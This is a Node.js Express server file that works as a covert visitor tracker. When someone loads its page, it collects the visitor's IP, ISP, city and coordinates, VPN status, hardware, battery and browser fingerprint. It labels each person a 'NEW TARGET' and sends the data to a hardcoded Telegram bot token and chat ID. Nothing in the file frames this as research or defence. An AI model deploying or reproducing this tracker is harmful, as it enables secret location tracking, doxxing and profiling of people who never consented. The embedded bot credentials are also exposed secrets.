const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());

// ====== CONFIGURATION ======
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ====== TELEGRAM DISPATCHER ======
async function sendToTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: "HTML"
      }),
    });
  } catch (err) { console.error("Telegram Error:", err); }
}

// ====== VISIT LOGGER ======
app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // Fetch ISP and Detailed Location
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
    const geo = await geoRes.json();

    const message = `
<b>🚀 NEW TARGET LOGGED (100% INTEL)</b>
------------------------------------
<b>🌐 NETWORK INFO</b>
<b>IP:</b> ${ip}
<b>ISP:</b> ${geo.isp}
<b>Organization:</b> ${geo.org}
<b>VPN/Proxy:</b> ${geo.proxy ? "YES ⚠️" : "No"}
<b>Hosting:</b> ${geo.hosting ? "YES (Data Center)" : "No"}

<b>📍 GEOGRAPHIC DATA</b>
<b>Location:</b> ${geo.city}, ${geo.regionName}, ${geo.country}
<b>Coordinates:</b> ${geo.lat}, ${geo.lon}
<b>Timezone:</b> ${client.timezone}

<b>💻 HARDWARE SPECIFICATIONS</b>
<b>OS/Platform:</b> ${client.platform}
<b>GPU:</b> ${client.gpu}
<b>CPU Cores:</b> ${client.cores}
<b>RAM:</b> ~${client.memory} GB
<b>Screen:</b> ${client.screen} (${client.pixelRatio}x density)
<b>Touch Points:</b> ${client.maxTouchPoints}

<b>🔋 DEVICE STATUS</b>
<b>Battery:</b> ${client.battery?.level || "N/A"} (${client.battery?.charging || "N/A"})
<b>Connection:</b> ${client.connection?.type || "N/A"} (Speed: ~${client.connection?.downlink} Mbps)

<b>🧠 BROWSER IDENTIFIER</b>
<b>Language:</b> ${client.languages}
<b>Referrer:</b> ${client.referrer}
<b>User-Agent:</b> <code>${req.headers["user-agent"]}</code>

<b>⏰ TIMESTAMP:</b> ${new Date().toUTCString()}
------------------------------------
`;

    await sendToTelegram(message);
    res.json({ status: "success" });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "internal_error" });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`[LOG] Server active on port ${PORT}`);
});
